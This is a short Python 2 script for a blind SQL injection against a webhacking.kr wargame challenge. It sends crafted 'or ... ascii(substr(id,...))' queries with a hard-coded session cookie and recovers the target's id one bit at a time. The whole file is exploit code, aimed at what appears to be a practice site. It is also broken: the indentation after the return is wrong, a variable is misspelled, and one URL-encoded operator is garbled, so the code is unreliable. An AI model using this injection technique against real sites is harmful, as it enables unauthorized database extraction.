import urllib2

count=1
to_find="True</b>"
var=20

def attack(count,bit):
    url="http://webhacking.kr/challenge/bonus/bonus-1/index.php?no==-1+or+no%%3D1+and+ascii%%28substr%%28id%%2C%d%%2C1%%29%%29%%66%d%%3D%d&id=&pw=" % (count,bit,bit)
    req = urllib2.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    req.add_header("Cookie", "PHPSESSID=b3443541331e3ff78d360b76cd4b4fbd")
     read = urllib2.urlopen(req).read()
     return read

     lenght=5
     print "id : "
     while 1:
         if count == length + 1:
             exit(0)

         bit=pow(2,7)
         count_false=0
         str_num=0
         while bit>=1:
             result=attack(count,bit)
             if to_find in result:
                 str_num += bit
             else:
                 count_false+=1

             bit /= 2
         if count_false >= 7:
             exit(0)
         print unichr(str_num)    

         count+=1